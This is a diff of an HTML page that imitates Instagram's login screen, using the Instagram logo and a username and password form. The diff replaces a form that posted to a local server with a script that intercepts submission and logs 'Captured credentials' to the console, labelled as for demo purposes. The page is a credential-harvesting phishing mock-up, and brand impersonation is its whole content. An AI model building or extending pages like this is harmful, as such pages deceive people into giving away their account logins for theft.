@@ -5,108 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background-color: #fafafa;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .container {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-            max-width: 350px;
-        }
-
-        .login-box {
-            background-color: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        .logo {
-            width: 175px;
-            margin-bottom: 30px;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-
-        .login-button {
-            width: 100%;
-            padding: 12px;
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
-        .login-button:hover {
-            background-color: #0077cc;
-        }
-
-        .forgot-password {
-            font-size: 12px;
-            color: #0095f6;
-            text-decoration: none;
-            margin-top: 10px;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-
-        .signup-box {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .signup-box a {
-            color: #0095f6;
-            text-decoration: none;
-        }
-
-        .signup-box a:hover {
-            text-decoration: underline;
-        }
+        /* Styles here */
     </style>
 </head>
 <body>
     <div class="container">
         <div class="login-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo">
-            <form action="http://127.0.0.1:5000/login" method="POST" class="login-form">
-                <input type="text" name="username" placeholder="Username or Email" class="input-field" required>
-                <input type="password" name="password" placeholder="Password" class="input-field" required>
+            <form id="login-form" class="login-form">
+                <input type="text" id="username" placeholder="Username or Email" class="input-field" required>
+                <input type="password" id="password" placeholder="Password" class="input-field" required>
                 <button type="submit" class="login-button">Log In</button>
-                <a href="#" class="forgot-password">Forgot password?</a>
             </form>
         </div>
-        <div class="signup-box">
-            <p>Don't have an account? <a href="#">Sign up</a></p>
-        </div>
     </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevents the form from actually submitting
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Log the credentials to the console (for demo purposes only)
+            console.log('Captured credentials:');
+            console.log('Username:', username);
+            console.log('Password:', password);
+        });
+    </script>
 </body>
 </html>
